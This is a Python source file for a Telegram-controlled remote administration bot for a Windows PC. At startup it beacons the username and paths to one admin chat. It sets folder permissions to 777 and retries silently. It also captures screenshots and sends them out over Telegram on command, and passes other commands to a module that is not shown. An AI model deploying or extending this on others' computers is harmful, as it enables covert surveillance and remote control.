import telebot
import os
import time

import modules.file_io as file_io
import modules.message_io as mes_io
import modules.system as system
from modules.emoj import *

VERSION = "1.0"
TOKEN_PATH = f"{system.scriptPath}\\token.txt"
START = f"{system.scriptPath}\\data\\message.txt"
AUTOSTART = f"{system.scriptPath}\\data\\on_start.txt"
ADMIN = int(file_io.readFile(f"{system.scriptPath}\\admin.txt"))
ACCESS_DENIED = f"{LOCK}Oops, it looks like this tool doesn't belong to you."


os.chmod(system.scriptPath, 777)

try:
    bot = telebot.TeleBot(file_io.readFile(TOKEN_PATH))
except:
    quit()

try:
    os.chdir(system.defaultStartFolder)
    bot.send_message(ADMIN, f"""{PC}PC Started
==========
{FILE}Script path: `{system.scriptPath}`
==========
{USER}User: `{system.username}`
==========
{FOLDER}Current path: `{system.getCurrentDir()}`
==========
{PREF}Version: {VERSION}
==========""", parse_mode="Markdown")
except:
    print("n/a")

@bot.message_handler(commands=["start", "info", "help"])

def start_message(message):
    if message.chat.id == ADMIN:
        bot.send_message(message.chat.id, file_io.readFile(START), parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, ACCESS_DENIED)

@bot.message_handler(content_types=["text"])

def text(message):
    if message.chat.id == ADMIN:
        if message.text == "screen":
            screen = system.getScreen()
            bot.send_document(message.chat.id, open(screen, "rb"))
            os.remove(screen)
        else:
            bot.send_message(message.chat.id, mes_io.messageProcessing(message.text), parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, ACCESS_DENIED)

while True:
    try: 
        bot.polling(non_stop=True)
    except:
        time.sleep(15)
